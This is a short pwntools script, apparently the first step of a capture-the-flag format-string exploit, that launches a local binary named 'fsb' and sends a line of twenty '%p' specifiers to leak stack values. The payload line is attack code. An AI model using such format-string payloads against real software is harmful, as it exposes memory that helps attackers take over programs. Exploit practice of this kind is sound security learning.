from pwn import *

# Start the vulnerable program
p = process("./fsb")

# Step 1: Leak stack to find position
p.sendline("%p " * 20)  # Adjust the count if needed
leak = p.recv()
print(leak)